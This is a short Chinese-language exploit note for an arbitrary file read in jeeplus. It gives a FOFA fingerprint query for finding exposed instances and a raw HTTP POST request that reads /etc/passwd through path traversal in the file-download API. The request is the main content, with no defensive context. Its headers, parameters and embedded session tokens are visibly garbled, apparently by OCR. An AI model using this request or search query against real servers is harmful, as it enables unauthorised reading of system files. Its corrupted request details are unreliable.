# K8-3jeeplus任意文件读取

<u></u>





### 漏洞描述：jeeplus任意文件读取



### Fofa语句：icon_hash="-234653047



### 漏洞复现：

```
PosT /jeeplus/api/sys/file/download HTTP/1.1
Host:User-Agent:Mozilla/5.0(Windows NT 10.0;win64;x64;
rv:109.0)Gecko/20100101 Firefox/114.0
Accept :
text/html,application/xhtml+xml,application/xml;q-0.9，1
mage/avif,image/webp*/*:q-0.8
Accept-Language:zh-CN,zh;q0.8,zh-TV;q0.7,zh-HK;q0.5,en-US;qO.3,en;q=0.2
Accept-Encoding:gzip，deflate开Content-Type:application/x-vww-form-urlencoded
Content-Length:42
Origin:}
Connection:close
Referer:
Cookie:wolfking.jeeplus.session.id
9dla67ef-906e-4ac1-84ab-66db44052753:token
eyJ0eXAiOiJKV1QiLCIhbGciOiJIUzIINiJ9.eYJ1eHAiOjE2OTYWNDM3NTHsInVz2XJuYW1lIjoiYvRtav4ifQ.kEtyOb kuohorqIje180ABoTuKVdcUD-loKVH4qrixH:refreshTokeneyJ0eXA1O1JKVIO1LCUhbGc1O1JIUzIIN1J9.eyJIeHA1O1E2OTYyMTYINTHsInVz2XJuYW1lIjoiYWRtaW4ifQ.4ACRGkxWXig8pE08kPox2fECA4goQAw2t4ghVgj9dRw:pageNo1:pagesize-10Upgrade-Insecure-Requests:1

15action dovnloadssource=../../../etc/passwd
```

